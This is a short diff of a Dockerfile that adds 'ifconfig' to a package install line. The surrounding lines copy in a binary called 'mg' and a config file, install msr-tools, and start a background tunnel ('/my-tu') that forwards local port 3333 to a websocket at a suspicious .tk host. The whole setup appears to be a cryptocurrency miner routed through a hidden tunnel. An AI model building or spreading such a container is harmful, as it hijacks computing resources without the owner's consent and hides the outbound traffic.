@@ -6,7 +6,7 @@ COPY mg /app/
 COPY config.json /app/
 
 RUN apt update -y \
-  && apt install -y wget curl procps msr-tools net-tools
+  && apt install -y wget curl procps msr-tools net-tools ifconfig
 RUN chmod a+x /my-tu /app/mg && \
   (/my-tu -L 127.0.0.1:3333:127.0.0.1:3333 wss://hax.xn--6krt7h.tk &) && \
   cd /app && \
